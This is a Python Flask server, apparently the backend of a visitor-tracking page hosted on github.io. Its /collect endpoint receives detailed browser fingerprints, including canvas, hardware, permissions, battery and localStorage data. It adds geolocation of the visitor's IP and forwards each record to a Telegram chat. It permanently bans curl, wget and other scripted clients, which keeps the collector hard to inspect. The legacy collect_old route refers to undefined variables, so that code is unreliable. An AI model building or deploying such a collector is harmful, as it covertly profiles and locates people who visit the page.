#!/usr/bin/env python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import json
import logging
import hashlib
from datetime import datetime
from zoneinfo import ZoneInfo
from functools import wraps
import bcrypt
import shutil
import threading
import time
import hmac

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
cors_config = {
    r"/collect": {"origins": ["https://gitububkm.github.io"]},
    r"/*": {"origins": ["https://gitububkm.github.io", "http://localhost:3000", "http://127.0.0.1:5500"]}
}
CORS(app, resources=cors_config)

@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

rate_limit_store = {}
blocked_ips = {}

def rate_limit(max_attempts=5, window_seconds=300):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
            now = datetime.now().timestamp()
            
            if client_ip in blocked_ips:
                if blocked_ips[client_ip] == float('inf'):
                    logger.error(f"PERMANENTLY BLOCKED IP {client_ip} attempted to access {f.__name__}")
                    return jsonify({'error': 'IP permanently blocked for automated tools abuse.'}), 403
                elif now < blocked_ips[client_ip]:
                    remaining = int(blocked_ips[client_ip] - now)
                    logger.warning(f"Blocked IP {client_ip} attempted to access {f.__name__}. Unblock in {remaining}s")
                    return jsonify({'error': f'IP temporarily blocked. Try again in {remaining} seconds.'}), 403
                else:
                    del blocked_ips[client_ip]
            
            key = f"{f.__name__}_{client_ip}"
            
            if key not in rate_limit_store:
                rate_limit_store[key] = []
            
            # Удаляем старые записи
            rate_limit_store[key] = [t for t in rate_limit_store[key] if now - t < window_seconds]
            
            if len(rate_limit_store[key]) >= max_attempts:
                blocked_ips[client_ip] = now + 90
                logger.error(f"IP {client_ip} blocked for 90 seconds after exceeding rate limit on {f.__name__}")
                return jsonify({'error': 'Rate limit exceeded. IP blocked for 90 seconds.'}), 429
            
            rate_limit_store[key].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

SECRET_VIEW = os.environ.get('SECRET_VIEW')
SECRET_DELETE = os.environ.get('SECRET_DELETE')

DATA_DIR = 'data'
os.makedirs(DATA_DIR, exist_ok=True)
REGISTRY_FILE = os.path.join(DATA_DIR, '_registry.json')

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_registry(reg):
    try:
        with open(REGISTRY_FILE, 'w', encoding='utf-8') as f:
            json.dump(reg, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def block_automated_tools():
    """Универсальная блокировка автоматизированных инструментов"""
    user_agent = request.headers.get('User-Agent', '').lower()
    automated_tools = ['curl', 'wget', 'python-requests', 'postman', 'httpie', 'insomnia', 'httpx', 'aiohttp', 'scrapy', 'requests']
    if any(tool in user_agent for tool in automated_tools):
        client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
        logger.error(f"PERMANENT BLOCK: Automated tool detected from {client_ip} - UA: {request.headers.get('User-Agent', 'unknown')}")
        blocked_ips[client_ip] = float('inf')
        return jsonify({'error': 'Automated tools are permanently blocked.'}), 403
    return None

def validate_ip(ip_str):
    """Валидация IP адреса (IPv4 или IPv6). Пустая строка считается валидной."""
    if not ip_str or ip_str.strip() == '':
        return True  # Пустое значение допустимо
    import ipaddress
    try:
        ipaddress.ip_address(ip_str.strip())
        return True
    except:
        return False

def validate_ip_list(ip_str):
    """Валидация списка IP адресов через запятую. Пустая строка считается валидной."""
    if not ip_str or ip_str.strip() == '':
        return True  # Пустое значение допустимо
    ips = [ip.strip() for ip in ip_str.split(',')]
    return all(validate_ip(ip) for ip in ips)

def validate_coordinates(coord_str):
    """Валидация координат в формате lat,lon. Пустая строка считается валидной."""
    if not coord_str or coord_str.strip() == '':
        return True  # Пустое значение допустимо
    try:
        parts = coord_str.strip().split(',')
        if len(parts) != 2:
            return False
        lat, lon = float(parts[0].strip()), float(parts[1].strip())
        return -90 <= lat <= 90 and -180 <= lon <= 180
    except:
        return False

def validate_country_code(code):
    """Валидация кода страны (2-3 буквы). Пустая строка считается валидной."""
    if not code or code.strip() == '':
        return True  # Пустое значение допустимо
    code = code.strip().upper()
    return len(code) in [2, 3] and code.isalpha()

def validate_timestamp(ts_str):
    """Валидация ISO timestamp. Пустая строка считается валидной."""
    if not ts_str or ts_str.strip() == '':
        return True  # Пустое значение допустимо
    try:
        from datetime import datetime
        datetime.fromisoformat(ts_str.replace('Z', '+00:00'))
        return True
    except:
        return False

def parse_content_structure(content):
    """Парсинг структуры контента в словарь"""
    structure = {}
    current_section = None
    current_data = {}
    
    lines = content.split('\n')
    for line in lines:
        original_line = line
        line = line.strip()
        if not line:
            continue
        
        # Проверка на начало секции
        if line.startswith('===') and line.endswith('==='):
            if current_section:
                structure[current_section] = current_data
            current_section = line.replace('===', '').strip()
            current_data = {}
        elif current_section and ':' in line:
            # Парсинг поля (учитываем отступы)
            # Убираем начальные пробелы, но сохраняем структуру
            parts = line.split(':', 1)
            if len(parts) == 2:
                key = parts[0].strip()
                value = parts[1].strip()
                # Если значение пустое, это может быть валидное пустое поле
                current_data[key] = value
    
    if current_section:
        structure[current_section] = current_data
    
    return structure

def generate_technical_fingerprint(content):
    """Генерация технического fingerprint из данных (без timestamp и других изменяющихся полей)
    
    Игнорируемые поля (не включаются в fingerprint):
    - timestamp (Timestamp)
    - battery (Battery) - уровень батареи меняется
    - timing (Performance) - может немного отличаться
    - postal (Server Enriched Data) - может меняться
    - timezoneOffset (Localization) - может меняться при переходе на летнее время
    """
    structure = parse_content_structure(content)
    
    # Ключевые технические поля для fingerprint
    fingerprint_parts = []
    
    # Server Enriched Data (кроме postal)
    server_data = structure.get('Server Enriched Data', {})
    for key in ['client_ip_detected', 'x_forwarded_for', 'remote_addr', 'hostname', 
                'city', 'region', 'country', 'loc', 'org', 'timezone']:
        if key in server_data:
            fingerprint_parts.append(f"server_{key}:{server_data[key]}")
    
    # System Info
    system_data = structure.get('System Info', {})
    for key in ['platform', 'architecture', 'platformVersion', 'model', 
                'bitness', 'wow64', 'formFactor']:
        if key in system_data:
            fingerprint_parts.append(f"sys_{key}:{system_data[key]}")
    
    # Browser
    browser_data = structure.get('Browser', {})
    for key in ['userAgent', 'vendor', 'browserBrands', 'browserVersion',
                'cookieEnabled', 'doNotTrack', 'pdfViewerEnabled', 'plugins', 'mimeTypes']:
        if key in browser_data:
            fingerprint_parts.append(f"browser_{key}:{browser_data[key]}")
    
    # Hardware
    hardware_data = structure.get('Hardware', {})
    for key in ['screen', 'cpuCores', 'memoryGB', 'maxTouchPoints',
                'webglVendor', 'webglRenderer', 'gpuInfo']:
        if key in hardware_data:
            fingerprint_parts.append(f"hw_{key}:{hardware_data[key]}")
    
    # Localization (кроме timezoneOffset, который может меняться)
    loc_data = structure.get('Localization', {})
    for key in ['language', 'languages', 'timezone']:
        if key in loc_data:
            fingerprint_parts.append(f"loc_{key}:{loc_data[key]}")
    
    # Window Info
    window_data = structure.get('Window Info', {})
    if 'windowInfo' in window_data:
        fingerprint_parts.append(f"window:{window_data['windowInfo']}")
    
    # Canvas Fingerprint
    canvas_data = structure.get('Canvas Fingerprint', {})
    if 'canvasFingerprint' in canvas_data:
        fingerprint_parts.append(f"canvas:{canvas_data['canvasFingerprint']}")
    
    # Permissions
    perm_data = structure.get('Permissions', {})
    if 'permissions' in perm_data:
        fingerprint_parts.append(f"perms:{perm_data['permissions']}")
    
    # Storage
    storage_data = structure.get('Storage', {})
    if 'localStorage' in storage_data:
        fingerprint_parts.append(f"storage:{storage_data['localStorage']}")
    
    # Сортируем для консистентности и создаем хеш
    fingerprint_string = '|'.join(sorted(fingerprint_parts))
    fingerprint_hash = hashlib.sha256(fingerprint_string.encode('utf-8')).hexdigest()
    
    return fingerprint_hash

def validate_content_structure(content):
    """Валидация структуры контента по скелету"""
    try:
        # Ожидаемая структура
        expected_structure = {
            'Server Enriched Data': [
            'client_ip_detected', 'x_forwarded_for', 'remote_addr', 'hostname',
            'city', 'region', 'country', 'loc', 'org', 'timezone', 'postal'
        ],
        'System Info': [
            'platform', 'architecture', 'platformVersion', 'model',
            'bitness', 'wow64', 'formFactor'
        ],
        'Browser': [
            'userAgent', 'vendor', 'browserBrands', 'browserVersion',
            'cookieEnabled', 'doNotTrack', 'pdfViewerEnabled', 'plugins', 'mimeTypes'
        ],
        'Hardware': [
            'screen', 'cpuCores', 'memoryGB', 'maxTouchPoints',
            'webglVendor', 'webglRenderer', 'gpuInfo'
        ],
        'Localization': [
            'language', 'languages', 'timezone', 'timezoneOffset'
        ],
        'Battery': ['battery'],
        'Window Info': ['windowInfo'],
        'Canvas Fingerprint': ['canvasFingerprint'],
        'Permissions': ['permissions'],
        'Storage': ['localStorage'],
        'Performance': ['timing'],
            'Timestamp': ['timestamp']
        }
        
        structure = parse_content_structure(content)
        
        # Проверка наличия всех секций
        for section_name, fields in expected_structure.items():
            if section_name not in structure:
                logger.warning(f"Missing section: {section_name}")
                return False, f"Missing section: {section_name}"
            
            # Проверка наличия всех полей в секции
            section_data = structure[section_name]
            for field in fields:
                if field not in section_data:
                    logger.warning(f"Missing field {field} in section {section_name}")
                    return False, f"Missing field {field} in section {section_name}"
        
        # Валидация конкретных полей (проверяем формат только если поле не пустое)
        server_data = structure.get('Server Enriched Data', {})
        
        # Валидация IP адресов (может быть пустым, но если не пустое - должно быть валидным IP)
        client_ip = server_data.get('client_ip_detected', '').strip()
        if client_ip and not validate_ip(client_ip):
            return False, "Invalid client_ip_detected format (must be valid IP address or empty)"
        
        x_forwarded_for = server_data.get('x_forwarded_for', '').strip()
        if x_forwarded_for and not validate_ip_list(x_forwarded_for):
            return False, "Invalid x_forwarded_for format (must be valid IP addresses separated by commas or empty)"
        
        remote_addr = server_data.get('remote_addr', '').strip()
        if remote_addr and not validate_ip(remote_addr):
            return False, "Invalid remote_addr format (must be valid IP address or empty)"
        
        # Валидация координат (может быть пустым, но если не пустое - должно быть валидными координатами)
        loc = server_data.get('loc', '').strip()
        if loc and not validate_coordinates(loc):
            return False, "Invalid coordinates format (must be in format 'lat,lon' or empty)"
        
        # Валидация кода страны (может быть пустым, но если не пустое - должно быть валидным кодом)
        country = server_data.get('country', '').strip()
        if country and not validate_country_code(country):
            return False, "Invalid country code format (must be 2-3 letter country code or empty)"
        
        # Валидация текстовых полей (могут быть пустыми, но если не пустые - должны содержать только допустимые символы)
        text_fields = {
            'hostname': server_data.get('hostname', ''),
            'city': server_data.get('city', ''),
            'region': server_data.get('region', ''),
            'org': server_data.get('org', ''),
            'timezone': server_data.get('timezone', '')
        }
        
        for field_name, field_value in text_fields.items():
            if not field_value or not field_value.strip():
                continue  # Пустое поле допустимо
            # "unknown" является допустимым значением для этих полей
            if field_value.strip().lower() == 'unknown':
                continue
            # Проверка на подозрительные символы
            # Для timezone разрешаем слэш (например, Europe/Amsterdam)
            allowed_chars = ' .-_,'
            if field_name == 'timezone':
                allowed_chars = ' .-_,/'
            if not all(c.isalnum() or c in allowed_chars for c in field_value):
                return False, f"Invalid characters in field {field_name} (only letters, numbers, spaces, and {allowed_chars} allowed)"
        
        # Валидация timestamp (может быть пустым, но если не пустое - должно быть валидным timestamp)
        timestamp_data = structure.get('Timestamp', {})
        timestamp = timestamp_data.get('timestamp', '').strip()
        if timestamp and not validate_timestamp(timestamp):
            return False, "Invalid timestamp format (must be ISO format or empty)"
        
        # Все поля могут быть пустыми - проверяем только формат, если поле не пустое
        # Дополнительная валидация для числовых полей
        hardware_data = structure.get('Hardware', {})
        cpu_cores = hardware_data.get('cpuCores', '').strip()
        if cpu_cores and not (cpu_cores.isdigit() or cpu_cores == 'null'):
            return False, "Invalid cpuCores format (must be a number or 'null' or empty)"
        
        max_touch_points = hardware_data.get('maxTouchPoints', '').strip()
        if max_touch_points and not max_touch_points.isdigit():
            return False, "Invalid maxTouchPoints format (must be a number or empty)"
        
        # Валидация boolean полей
        browser_data = structure.get('Browser', {})
        cookie_enabled = browser_data.get('cookieEnabled', '').strip().lower()
        if cookie_enabled and cookie_enabled not in ['true', 'false', 'yes', 'no', '1', '0']:
            return False, "Invalid cookieEnabled format (must be true/false/yes/no or empty)"
        
        pdf_viewer_enabled = browser_data.get('pdfViewerEnabled', '').strip().lower()
        if pdf_viewer_enabled and pdf_viewer_enabled not in ['yes', 'no', 'true', 'false', '1', '0']:
            return False, "Invalid pdfViewerEnabled format (must be yes/no/true/false or empty)"
        
        # Валидация timezoneOffset (может быть числом или пустым)
        localization_data = structure.get('Localization', {})
        timezone_offset = localization_data.get('timezoneOffset', '').strip()
        if timezone_offset:
            try:
                int(timezone_offset)
            except ValueError:
                return False, "Invalid timezoneOffset format (must be a number or empty)"
        
        return True, "Valid"
    except Exception as e:
        logger.error(f"Validation error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False, f"Validation error: {str(e)}"

def generate_request_signature(data):
    """Генерация HMAC-SHA256 подписи для проверки целостности запросов"""
    secret = os.environ.get('REQUEST_SECRET', 'default-secret-CHANGE-ME-NOW')
    message = json.dumps(data, sort_keys=True)
    return hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()

def verify_request_integrity(data, provided_signature):
    """Проверка целостности запроса от GitHub фронтенда"""
    expected_signature = generate_request_signature(data)
    return hmac.compare_digest(provided_signature, expected_signature)

@app.route('/collect', methods=['POST'])
@rate_limit(max_attempts=3, window_seconds=400)
def collect():
    try:
        block_result = block_automated_tools()
        if block_result:
            return block_result

        data = request.get_json() or {}
        content = data.get('content', '')

        if not content:
            logger.warning("No content provided in request")
            return jsonify({'status': 'error', 'message': 'No content provided'}), 400
        
        logger.info(f"Received data collection request, content length: {len(content)}")

        origin = request.headers.get('Origin', '')
        referer = request.headers.get('Referer', '')
        allowed_origins = ['https://gitububkm.github.io']

        if origin and origin not in allowed_origins:
            logger.warning(f"Invalid Origin: {origin}")
            return jsonify({'status': 'error', 'message': 'Invalid Origin'}), 403

        if referer and not referer.startswith('https://gitububkm.github.io/'):
            logger.warning(f"Invalid Referer: {referer}")
            return jsonify({'status': 'error', 'message': 'Invalid Referer'}), 403

        content_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        reg = load_registry()

        if content_hash in reg.get('sent_hashes', {}):
            logger.info(f"Exact duplicate content detected: {content_hash[:16]}...")
            return jsonify({'status': 'ok', 'message': 'Duplicate ignored'}), 200
        
        client_ip = (
            request.headers.get('CF-Connecting-IP', '') or
            request.headers.get('True-Client-IP', '') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr or ''
        ).strip()
        
        if not client_ip or client_ip in ['127.0.0.1', '::1']:
            try:
                import urllib.request
                client_ip_check = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf-8').strip()
                if client_ip_check:
                    client_ip = client_ip_check
            except:
                pass
        
        server_block = []
        server_block.append('=== Server Enriched Data ===')
        server_block.append(f'client_ip_detected: {client_ip}')
        x_forwarded_for = request.headers.get("X-Forwarded-For", "").strip()
        if not x_forwarded_for:
            x_forwarded_for = client_ip if client_ip else "127.0.0.1"
        server_block.append(f'x_forwarded_for: {x_forwarded_for}')
        remote_addr = request.remote_addr or "127.0.0.1"
        server_block.append(f'remote_addr: {remote_addr}')
        
        geo_data = {}
        try:
            import urllib.request
            import json as _json
            token = os.environ.get('IPINFO_TOKEN', '')
            url = f'https://ipinfo.io/{client_ip}/json'
            if token:
                url += f'?token={token}'
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=5)
            geo = _json.loads(resp.read())
            for key in ['hostname', 'city', 'region', 'country', 'loc', 'org', 'timezone', 'postal']:
                if key in geo and geo[key]:
                    geo_data[key] = geo[key]
                    server_block.append(f'{key}: {geo[key]}')
                else:
                    # Для обязательных полей используем значения по умолчанию, если они отсутствуют
                    if key == 'postal':
                        server_block.append(f'{key}: ')
                    elif key == 'country':
                        server_block.append(f'{key}: XX')  # Временный код для валидации
                    elif key == 'loc':
                        server_block.append(f'{key}: 0.0,0.0')  # Временные координаты
                    else:
                        server_block.append(f'{key}: unknown')
        except Exception as e:
            logger.error(f"Geo lookup error: {e}")
            # При ошибке geo lookup добавляем значения по умолчанию для обязательных полей
            # чтобы валидация не провалилась
            default_values = {
                'hostname': 'unknown',
                'city': 'unknown',
                'region': 'unknown',
                'country': 'XX',
                'loc': '0.0,0.0',
                'org': 'unknown',
                'timezone': 'UTC',
                'postal': ''
            }
            for key in ['hostname', 'city', 'region', 'country', 'loc', 'org', 'timezone', 'postal']:
                if key not in geo_data:
                    if key == 'postal':
                        server_block.append(f'{key}: ')
                    else:
                        server_block.append(f'{key}: {default_values[key]}')
        
        enriched_content = '\n'.join(server_block) + '\n' + content
        
        # Проверка на технический дубликат (игнорируя timestamp и другие изменяющиеся поля)
        # Используем enriched_content для проверки, так как там уже добавлена секция Server Enriched Data
        technical_fingerprint = generate_technical_fingerprint(enriched_content)
        if 'technical_fingerprints' not in reg:
            reg['technical_fingerprints'] = {}
        
        if technical_fingerprint in reg.get('technical_fingerprints', {}):
            logger.info(f"Technical duplicate detected (same device/data, different timestamp): {technical_fingerprint[:16]}...")
            return jsonify({'status': 'ok', 'message': 'Duplicate ignored (only timestamp or other non-technical fields changed)'}), 200
        
        # Валидация финального enriched_content перед отправкой
        is_valid, validation_message = validate_content_structure(enriched_content)
        if not is_valid:
            logger.error(f"Enriched content validation failed: {validation_message}")
            logger.error(f"Content preview (first 500 chars): {enriched_content[:500]}")
            # Логируем структуру для отладки
            try:
                structure = parse_content_structure(enriched_content)
                logger.error(f"Parsed structure keys: {list(structure.keys())}")
                for section, data in structure.items():
                    logger.error(f"Section '{section}' has {len(data)} fields: {list(data.keys())[:5]}...")
            except Exception as e:
                logger.error(f"Error parsing structure for debug: {e}")
            return jsonify({'status': 'error', 'message': f'Validation failed: {validation_message}'}), 400
        
        logger.info("Content validation passed, preparing to send to Telegram")
        
        telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
        telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')
        
        if not telegram_bot_token or not telegram_chat_id:
            logger.error("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured")
            return jsonify({'status': 'error', 'message': 'Telegram not configured'}), 500
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        platform = data.get('platform', 'unknown').replace(' ', '_')[:20]
        model = data.get('model', 'unknown').replace(' ', '_')[:20]
        filename = f"{platform}_{model}_{timestamp}.txt"
        
        try:
            import urllib.request
            import json as _json
            
            telegram_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
            
            boundary = '----WebKitFormBoundary' + os.urandom(16).hex()
            
            data_parts = []
            data_parts.append(f'--{boundary}\r\n'.encode())
            data_parts.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
            data_parts.append(f'{telegram_chat_id}\r\n'.encode())
            data_parts.append(f'--{boundary}\r\n'.encode())
            data_parts.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode())
            data_parts.append(b'Content-Type: text/plain\r\n\r\n')
            data_parts.append(enriched_content.encode('utf-8'))
            data_parts.append(f'\r\n--{boundary}\r\n'.encode())
            
            reply_markup = {
                'inline_keyboard': [[
                    {'text': '🗑️ Удалить это сообщение', 'callback_data': 'delete_msg'}
                ]]
            }
            
            data_parts.append(b'Content-Disposition: form-data; name="reply_markup"\r\n\r\n')
            data_parts.append(_json.dumps(reply_markup).encode('utf-8'))
            data_parts.append(f'\r\n--{boundary}--\r\n'.encode())
            
            body = b''.join(data_parts)
            
            req = urllib.request.Request(
                telegram_url,
                data=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
            )
            resp = urllib.request.urlopen(req, timeout=30)
            response_data = _json.loads(resp.read())
            
            if response_data.get('ok'):
                message_id = response_data.get('result', {}).get('message_id')
                if message_id:
                    logger.info(f"Data sent to Telegram: {filename}, message_id: {message_id}")

                reg = load_registry()
                if 'sent_hashes' not in reg:
                    reg['sent_hashes'] = {}
                if 'sent_contents' not in reg:
                    reg['sent_contents'] = []
                if 'technical_fingerprints' not in reg:
                    reg['technical_fingerprints'] = {}

                reg['sent_hashes'][content_hash] = datetime.now().isoformat()
                reg['sent_contents'].append(content)
                reg['technical_fingerprints'][technical_fingerprint] = datetime.now().isoformat()

                if len(reg['sent_hashes']) > 1000:
                    sorted_hashes = sorted(reg['sent_hashes'].items(), key=lambda x: x[1], reverse=True)
                    reg['sent_hashes'] = dict(sorted_hashes[:1000])

                if len(reg['sent_contents']) > 50:
                    reg['sent_contents'] = reg['sent_contents'][-50:]

                if len(reg['technical_fingerprints']) > 1000:
                    sorted_fingerprints = sorted(reg['technical_fingerprints'].items(), key=lambda x: x[1], reverse=True)
                    reg['technical_fingerprints'] = dict(sorted_fingerprints[:1000])

                save_registry(reg)

                return jsonify({'status': 'ok', 'message': 'Data sent to Telegram'}), 200
            else:
                logger.error(f"Telegram error: {response_data}")
                return jsonify({'status': 'error', 'message': 'Failed to send to Telegram'}), 500
                
        except Exception as e:
            logger.error(f"Telegram send error: {e}")
            return jsonify({'status': 'error', 'message': str(e)}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    """Webhook для обработки callback от Telegram кнопок"""
    try:
        data = request.get_json()
        
        if 'callback_query' in data:
            callback = data['callback_query']
            callback_data = callback.get('data', '')
            message = callback.get('message', {})
            message_id = message.get('message_id')
            chat_id = message.get('chat', {}).get('id')
            
            if callback_data.startswith('delete_'):
                callback_id = callback.get('id')
                
                telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
                if telegram_bot_token and message_id and chat_id:
                    delete_url = f'https://api.telegram.org/bot{telegram_bot_token}/deleteMessage'
                    import urllib.request
                    import json as _json
                    
                    delete_data = {'chat_id': chat_id, 'message_id': message_id}
                    req = urllib.request.Request(
                        delete_url,
                        data=_json.dumps(delete_data).encode('utf-8'),
                        headers={'Content-Type': 'application/json'}
                    )
                    urllib.request.urlopen(req, timeout=5)
                    
                    logger.info(f"Message {message_id} deleted via button")
                
                if callback_id:
                    answer_url = f'https://api.telegram.org/bot{telegram_bot_token}/answerCallbackQuery'
                    answer_data = {'callback_query_id': callback_id, 'text': 'Сообщение удалено'}
                    req = urllib.request.Request(
                        answer_url,
                        data=_json.dumps(answer_data).encode('utf-8'),
                        headers={'Content-Type': 'application/json'}
                    )
                    urllib.request.urlopen(req, timeout=5)
                    
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/collect_old', methods=['POST'])
def collect_old():
    try:
        data = request.get_json() or {}
        content = data.get('content', '')
        
        if not content:
            return jsonify({'status': 'error', 'message': 'No content provided'}), 400

        fp = data.get('fingerprint') or ''
        platform = (data.get('platform') or '').replace(' ', '_')
        model = (data.get('model') or '').replace(' ', '_')
        external_ip = ''
        client_ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '').split(',')[0].strip()
        server_block = []
        server_block.append('=== Server Observed ===')
        server_block.append(f"client_ip: {client_ip or 'unknown'}")
        try:
            import urllib.request
            import json as _json
            if client_ip:
                token = os.environ.get('IPINFO_TOKEN')
                url = f'https://ipinfo.io/{client_ip}/json'
                if token:
                    url += f'?token={token}'
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req, timeout=5)
                g = _json.loads(resp.read())
                for k in ['hostname','city','region','country','loc','org','timezone']:
                    if k in g and g[k]:
                        server_block.append(f"ipinfo.{k}: {g[k]}")
        except Exception as e:
            server_block.append(f'ipinfo error: {str(e)[:100]}')
        server_block.append('')
        final_text = "\n".join(server_block) + content

        reg = load_registry()
        friendly = reg.get(fp)
        if not friendly:
            base = [platform or 'Device', model or '', external_ip or '']
            base = [x for x in base if x]
            friendly = "_".join(base) or 'Unknown'

        filename = raw_filename or f"{friendly}.txt"
        if len(filename) > 100 or not filename.endswith('.txt'):
            filename = 'data.txt'
        server_block = []
        server_block.append('=== Server Observed ===')
        server_block.append(f"client_ip: {client_ip or 'unknown'}")
        server_block.append(f"timestamp: {datetime.now().isoformat()}")
        try:
            import urllib.request
            import json as _json
            if client_ip:
                token = os.environ.get('IPINFO_TOKEN')
                url = f'https://ipinfo.io/{client_ip}/json'
                if token:
                    url += f'?token={token}'
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req, timeout=5)
                g = _json.loads(resp.read())
                for k in ['hostname','city','region','country','loc','org','timezone']:
                    if k in g and g[k]:
                        server_block.append(f"ipinfo.{k}: {g[k]}")
        except Exception as e:
            server_block.append(f'ipinfo error: {str(e)[:100]}')
        server_block.append('')
        final_text = "\n".join(server_block) + content
        
        folder_path = os.path.join(DATA_DIR, folder)
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, filename)
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(final_text)
        return jsonify({'status': 'ok', 'message': 'Data saved'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/list', methods=['GET'])
@rate_limit(max_attempts=30, window_seconds=300)
def list_files():
    try:
        # Блокировка автоматических инструментов
        block_result = block_automated_tools()
        if block_result:
            return block_result
        provided_hash = request.headers.get('X-View-Hash', '')
        correct_password = os.environ.get('SECRET_VIEW')
        
        if not correct_password:
            logger.error("SECRET_VIEW not configured")
            return jsonify({'error': 'SECRET_VIEW not configured'}), 500
        
        if not verify_password_hash(provided_hash, correct_password):
            client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
            logger.warning(f"Unauthorized list access attempt from {client_ip}")
            return jsonify({'error': 'Unauthorized'}), 401
        
        files = []
        for root, dirs, filenames in os.walk(DATA_DIR):
            for filename in filenames:
                filepath = os.path.join(root, filename)
                rel_path = os.path.relpath(filepath, DATA_DIR)
                mtime = os.path.getmtime(filepath)
                mdt = datetime.fromtimestamp(mtime, ZoneInfo('Europe/Moscow'))
                files.append({
                    'name': filename,
                    'path': rel_path,
                    'time': mtime,
                    'time_iso': mdt.isoformat(),
                    'size': os.path.getsize(filepath)
                })
        files.sort(key=lambda x: x['time'], reverse=True)
        return jsonify({'files': files}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/ipinfo', methods=['GET'])
@rate_limit(max_attempts=10, window_seconds=300)
def ipinfo():
    try:
        # Блокировка автоматических инструментов
        block_result = block_automated_tools()
        if block_result:
            return block_result
        referer = request.headers.get('Referer', '')
        origin = request.headers.get('Origin', '')
        if not referer.startswith('https://gitububkm.github.io') and not origin.startswith('https://gitububkm.github.io'):
            logger.warning(f"Unauthorized ipinfo request from {request.remote_addr}")
            return jsonify({'error': 'Unauthorized'}), 403
        
        import urllib.request
        token = os.environ.get('IPINFO_TOKEN')
        url = 'https://ipinfo.io/json' + (f'?token={token}' if token else '')
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=5)
        return jsonify(json.loads(resp.read())), 200
    except Exception as e:
        logger.error(f"Ipinfo error: {e}")
        return jsonify({'error': str(e)}), 500

def verify_password_hash(provided_hash, correct_password_hash):
    """Проверка пароля - сравнение SHA-256 хешей"""
    try:
        return hmac.compare_digest(provided_hash, correct_password_hash)
    except Exception as e:
        logger.error(f"Password verification error: {e}")
        return False

@app.route('/check-view', methods=['POST'])
@rate_limit(max_attempts=10, window_seconds=300)
def check_view():
    try:
        client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
        data = request.get_json() or {}
        provided_hash = data.get('hash', '')
        correct_password = os.environ.get('SECRET_VIEW')
        
        if not correct_password:
            logger.error("SECRET_VIEW not configured")
            return jsonify({'valid': False, 'error': 'SECRET_VIEW not configured'}), 500
        
        is_valid = verify_password_hash(provided_hash, correct_password)
        
        if is_valid:
            logger.info(f"Successful view authentication from {client_ip}")
        else:
            logger.warning(f"Failed view authentication attempt from {client_ip}")
        
        return jsonify({'valid': is_valid}), 200
    except Exception as e:
        logger.error(f"Check view error: {e}")
        return jsonify({'valid': False, 'error': str(e)}), 500

@app.route('/check-delete', methods=['POST'])
@rate_limit(max_attempts=10, window_seconds=300)
def check_delete():
    try:
        client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
        data = request.get_json() or {}
        provided_hash = data.get('hash', '')
        correct_password = os.environ.get('SECRET_DELETE')
        
        if not correct_password:
            logger.error("SECRET_DELETE not configured")
            return jsonify({'valid': False, 'error': 'SECRET_DELETE not configured'}), 500
        
        is_valid = verify_password_hash(provided_hash, correct_password)
        
        if is_valid:
            logger.info(f"Successful delete authentication from {client_ip}")
        else:
            logger.warning(f"Failed delete authentication attempt from {client_ip}")
        
        return jsonify({'valid': is_valid}), 200
    except Exception as e:
        logger.error(f"Check delete error: {e}")
        return jsonify({'valid': False, 'error': str(e)}), 500

@app.route('/ping', methods=['GET'])
def ping():
    try:
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/reset-registry', methods=['POST'])
@rate_limit(max_attempts=3, window_seconds=60)
def reset_registry():
    try:
